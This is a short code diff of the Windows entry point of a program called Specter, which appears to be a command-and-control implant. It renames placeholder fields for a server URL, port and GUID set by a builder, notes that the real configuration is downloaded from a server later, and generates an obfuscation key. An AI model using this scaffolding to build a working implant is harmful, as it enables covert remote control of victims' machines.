@@ -7,8 +7,8 @@ import Algorithm;
 #include "SpecterLib/InitialConfig.h"
 
 
-//import ProcessUtils
-//if (ProcessUtils::IsProcessElevated())
+//#include "SpecterLib/SelfProcessUtils.h"
+//if (SelfProcessUtils::IsProcessElevated())
 //{
 //	// TODO Admin Install Mode and then Exit
 //}
@@ -23,10 +23,10 @@ int WINAPI wWinMain(_In_ HINSTANCE, _In_opt_ HINSTANCE, _In_ LPWSTR, _In_ int)
 {
 	// Configurable fields from the SpecterBuilder, these string literals can be overriden (but not past their limit) very easily,
 	// And with it, we can configure initial behavior of Specter, until we can download the real configuration from the server itself.
-	std::wstring name = StrUtils::Widen("$(SPECTER_BINARY_NAME)");
-	std::string server_url = "$(SPECTER_SERVER_URL_HERE)";
-	std::string server_port = "$(SPECTER_PORT_HERE)";
-	std::string guid = "$(SPECTER_GUID_HERE)";
+	std::wstring name = StrUtils::Widen("SPECTER_BINARY_NAME");
+	std::string server_url = "SPECTER_SERVER_URL_HERE";
+	std::string server_port = "SPECTER_PORT_HERE";
+	std::string guid = "SPECTER_GUID_HERE";
 
 	// Deploy as normal user
 	uint8_t obscrypto_key = Algorithm::GenerateRandomUInt<uint8_t>();
